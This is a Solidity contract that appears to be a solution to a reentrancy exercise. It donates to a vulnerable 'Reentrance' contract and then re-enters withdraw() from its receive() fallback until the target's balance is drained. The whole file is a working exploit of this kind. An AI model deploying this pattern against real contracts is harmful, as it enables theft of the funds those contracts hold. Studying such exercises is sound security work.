// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        uint remainingBalance = address(contractAddress).balance;
        if(remainingBalance > 0) {
            Reentrance(contractAddress).withdraw();
        }
    }

    function hackContract() external {
        // Code me!
        Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
        uint remainingBalance = address(contractAddress).balance;
        if(remainingBalance > 0) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
